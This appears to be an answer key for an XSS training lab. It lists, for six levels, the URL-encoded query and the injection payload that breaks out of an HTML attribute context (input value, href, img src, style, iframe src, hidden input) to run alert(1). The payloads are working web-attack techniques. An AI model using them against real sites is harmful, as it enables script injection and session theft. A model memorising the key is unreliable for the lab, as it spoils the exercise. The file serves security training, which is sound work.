# attrctx — solutions

Reflections inside HTML attribute values across input/href/src/style/iframe contexts.

### attrctx-level1

`/attrctx/level1/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `"><img src=x onerror=alert(1)>`
- context: inside <input value="…">

### attrctx-level2

`/attrctx/level2/?query=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: href attribute — javascript: scheme fires on click

### attrctx-level3

`/attrctx/level3/?query=%27%20onerror=alert(1)%20x=%27`

- payload: `' onerror=alert(1) x='`
- context: <img src='…'> with " encoded to &quot; — single quotes pass through

### attrctx-level4

`/attrctx/level4/?query=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `"><img src=x onerror=alert(1)>`
- context: inside <div style="color: …"> — close attr then inject tag

### attrctx-level5

`/attrctx/level5/?query=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: <iframe src="…"> — javascript: scheme

### attrctx-level6

`/attrctx/level6/?query=%22%20type=text%20onfocus=alert(1)%20autofocus%20x=%22`

- payload: `" type=text onfocus=alert(1) autofocus x="`
- context: hidden input — override type to text + autofocus to trigger onfocus
